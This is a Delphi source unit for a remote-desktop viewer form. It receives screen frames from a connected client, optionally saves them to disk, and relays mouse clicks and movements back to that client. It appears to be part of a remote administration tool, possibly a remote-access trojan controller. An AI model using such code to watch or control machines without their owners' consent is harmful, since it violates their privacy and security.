unit UnitDesktop;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, UnitConnection, IniFiles, StdCtrls, Spin, ExtCtrls, ComCtrls,
  IdTCPServer, UnitMain, jpeg;

type
  TFormDesktop = class(TForm)
    stat1: TStatusBar;
    pnl1: TPanel;
    btn1: TButton;
    chk1: TCheckBox;
    chk2: TCheckBox;
    trckbr1: TTrackBar;
    chk3: TCheckBox;
    img1: TImage;
    se1: TSpinEdit;
    procedure img1MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure img1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure trckbr1Change(Sender: TObject);
    procedure se1Change(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: PConnectionDatas;
    ClientNew: TIdPeerThread;
    hWidth, hHeight: Integer;
    LastClick: DWORD;
    LastInterval, LastQuality: Integer;
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
    procedure OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
  end;

var
  FormDesktop: TFormDesktop;

implementation

uses
  UnitConstants, UnitRepository, UnitFunctions, UnitStringCompression;

{$R *.dfm}
            
constructor TFormDesktop.Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
begin
  inherited Create(aOwner);
  Client := ConnDatas;
end;

procedure TFormDesktop.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormDesktop.OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
var
  TmpStr: string;
  Stream: TMemoryStream;
  Jpg: TJPEGImage;
  Bmp: TBitmap;
  i: Integer;
begin
  ClientNew := AThread;

  if btn1.Enabled = False then
  begin
    btn1.Caption := 'Stop';
    btn1.Enabled := True;
  end;

  while AThread.Connection.Connected = True do
  begin
    i := GetTickcount;
    while GetTickcount < i + 5 do Application.ProcessMessages;

    ReceivedDatas := ReceiveDatas(AThread);
    if Length(ReceivedDatas) = 0 then Exit;
    
    stat1.Panels.Items[0].Text := 'Frame size: ' + FileSizeToStr(Length(ReceivedDatas));

    Stream := TMemoryStream.Create;
    StrToStream(ReceivedDatas, Stream);
    Stream.Position := 0;

    Jpg := TJPEGImage.Create;
    try
      Jpg.LoadFromStream(Stream);
      Stream.Free;
      Bmp := TBitmap.Create;
      Bmp.Assign(jpg);
      Jpg.Free;
    except
      Jpg.Free;
      Bmp.Free;
      Stream.Free;
    end;

    if chk3.Checked then
    begin
      TmpStr := GetDesktopFolder(Client.Identification);
      TmpStr := TmpStr + '\' + MyGetDate('-');
      if not DirectoryExists(TmpStr) then CreateDir(TmpStr);
      TmpStr := TmpStr + '\' + MyGetTime('') + '.bmp';
      Bmp.SaveToFile(TmpStr);
    end;

    img1.Picture.Bitmap.Assign(Bmp);
    Bmp.Free;

    if (LastInterval <> se1.Value) or (LastQuality <> trckbr1.Position) then
    begin
      LastQuality := trckbr1.Position;
      LastInterval := se1.Value;

      SendDatas(Client.AThread, DESKTOPSETTINGS + '|' +
                IntToStr(LastQuality) + '|' + IntToStr(img1.Width) + '|' +
                IntToStr(img1.Height) + '|' + IntToStr(LastInterval));
    end;
  end;
end;

procedure TFormDesktop.img1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  Point: TPoint;
begin
  if chk1.Checked = False then Exit;

  Point.X := (X * hWidth) div img1.Width;
  Point.Y := (Y * hHeight) div img1.Height;

  if GetTickCount - LastClick < 250 then
  begin
    if Button = MbLeft then
    SendDatas(Client.AThread, MOUSELEFTDOUBLECLICK + '|' +
              inttostr(Point.X) + '|' + inttostr(Point.Y));

    if Button = MbRight then
    SendDatas(Client.AThread, MOUSERIGHTDOUBLECLICK + '|' +
              inttostr(Point.X) + '|' + inttostr(Point.Y));
  end
  else
  begin
    if Button = MbLeft then
    SendDatas(Client.AThread, MOUSELEFTCLICK + '|' +
              inttostr(Point.X) + '|' + inttostr(Point.Y));

    if Button = MbRight then
    SendDatas(Client.AThread, MOUSERIGHTCLICK + '|' +
              inttostr(Point.X) + '|' + inttostr(Point.Y));
  end;

  LastClick := GetTickCount;
end;

procedure TFormDesktop.img1MouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
var
  Point: TPoint;
begin
  if chk2.Checked = False then Exit;
  Point.X := (X * hWidth) div img1.Width;
  Point.Y := (Y * hHeight) div img1.Height;
  SendDatas(Client.AThread, MOUSEMOVECURSOR + '|' +
            inttostr(Point.X) + '|' + inttostr(Point.Y ));
end;

procedure TFormDesktop.trckbr1Change(Sender: TObject);
begin
  stat1.Panels.Items[1].Text := 'Image quality: ' + IntToStr(trckbr1.Position) + '%';
end;

procedure TFormDesktop.se1Change(Sender: TObject);
begin
  stat1.Panels.Items[2].Text := 'Interval refresh: ' + se1.Text + 's';
end;

procedure TFormDesktop.btn1Click(Sender: TObject);
begin
  if btn1.Caption = 'Start' then
  begin
    btn1.Enabled := False;
    LastInterval := se1.Value;
    LastQuality := trckbr1.Position;
    SendDatas(Client.AThread, DESKTOPCAPTURESTART + '|' +
              IntToStr(trckbr1.Position) + '|' + IntToStr(img1.Width) + '|' +
              IntToStr(img1.Height) + '|' + se1.Text);
  end
  else
  begin
    btn1.Caption := 'Start';
    ClientNew.Connection.Disconnect;
    stat1.Panels.Items[0].Text := 'Frame size: 0.0 Kb';
  end;
end;

procedure TFormDesktop.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  if btn1.Caption = 'Stop' then btn1.Click;

  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  IniFile.WriteInteger('Desktop', 'Left', Left);
  IniFile.WriteInteger('Desktop', 'Top', Top);
  IniFile.WriteInteger('Desktop', 'Width', Width);
  IniFile.WriteInteger('Desktop', 'Height', Height);  
  IniFile.WriteInteger('Desktop', 'Image quality', trckbr1.Position);
  IniFile.WriteString('Desktop', 'Refresh interval', se1.Text);
  IniFile.WriteBool('Desktop', 'Clicks', chk1.Checked);    
  IniFile.WriteBool('Desktop', 'Cursor', chk2.Checked);
  IniFile.WriteBool('Desktop', 'Autosave', chk3.Checked);
  IniFile.Free;
end;

procedure TFormDesktop.FormCreate(Sender: TObject);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  Left := IniFile.ReadInteger('Desktop', 'Left', 320);
  Top := IniFile.ReadInteger('Desktop', 'Top', 178);
  Width := IniFile.ReadInteger('Desktop', 'Width', 416);
  Height := IniFile.ReadInteger('Desktop', 'Height', 274);
  trckbr1.Position := IniFile.ReadInteger('Desktop', 'Image quality', 50);
  se1.Text := IniFile.ReadString('Desktop', 'Refresh interval', '1');
  chk1.Checked := IniFile.ReadBool('Desktop', 'Clicks', False);
  chk2.Checked := IniFile.ReadBool('Desktop', 'Cursor', False);
  chk3.Checked := IniFile.ReadBool('Desktop', 'Autosave', False);
  IniFile.Free;
end;

procedure TFormDesktop.FormShow(Sender: TObject);
var
  TmpStr: string;
begin
  TmpStr := Client.ConnInfos.ScreenRes;
  hWidth := StrToInt(Copy(TmpStr, 1, Pos('x', TmpStr)-1));
  Delete(TmpStr, 1, Pos('x', TmpStr));
  hHeight := StrToInt(TmpStr);
  
  if AutostartDesk then btn1.Click;
end;

end.
